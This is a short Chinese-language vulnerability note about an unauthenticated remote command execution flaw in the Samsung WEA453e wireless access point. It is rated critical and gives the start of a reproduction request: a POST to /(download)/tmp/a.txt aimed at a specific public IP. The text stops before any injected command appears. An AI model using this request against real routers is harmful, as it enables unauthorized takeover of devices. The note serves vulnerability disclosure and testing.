# 三星 WLAN AP WEA453e路由器 远程命令执行漏洞

## 漏洞描述
三星 WLAN AP WEA453e路由器 存在远程命令执行漏洞，可在未授权的情况下执行任意命令获取服务器权限。

## 危害等级
CRITICAL

## 参考链接

## 漏洞复现方法
登录页面如下

![](images/202202110918151.png)

请求包如下

```plain
POST /(download)/tmp/a.txt HTTP/1.1
Host: 175.199.182.152
Connection: close
